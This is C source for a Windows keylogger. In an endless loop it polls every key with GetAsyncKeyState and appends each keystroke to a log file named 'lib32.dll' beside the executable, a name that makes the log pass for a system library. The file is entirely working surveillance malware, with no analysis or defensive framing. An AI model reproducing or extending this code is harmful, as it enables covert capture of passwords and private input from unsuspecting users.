#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <shlwapi.h>

#include "key.h"

#define KEY_LOG "lib32.dll"
#define LEN_NAME 512

int main(int argc, char **argv){
    int i = 0;
    int state = 0;
    setlocale(LC_ALL, "Russian");
    char path[LEN_NAME] = {'\0'};
    char fullpath[LEN_NAME] = {'\0'};
    GetModuleFileName(NULL, path, LEN_NAME - 1);
    PathRemoveFileSpec(path);
    snprintf(fullpath, LEN_NAME - 1, "%s\\%s", path, KEY_LOG);
    while(true){
        for(i = 0; i < 255; i++){
            state = GetAsyncKeyState(i);
            if(state == 1 || state == -32767){
                save_file(fullpath, key_value(i));
                break;
            }
        }
        Sleep(1);
    }
    return 0;
}
